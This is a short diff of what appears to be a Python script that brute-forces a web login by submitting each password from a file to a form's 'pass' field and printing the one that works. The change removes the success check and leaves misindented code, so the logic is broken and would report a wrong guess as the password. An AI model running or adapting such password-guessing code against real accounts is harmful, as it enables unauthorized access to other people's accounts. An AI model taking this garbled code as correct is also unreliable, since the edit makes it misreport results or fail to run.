@@ -47,8 +47,8 @@ while file:
 			browser.form['pass'] = passw
 			response = browser.submit()
 			response_data = response.read()
-			if 'password' in response_data 
-				print('Your password is : ',passw)
+			
+                        print('Your password is : ',passw)
 				break
 	except:
 		print('\nSleeping for time : 0 min\n')
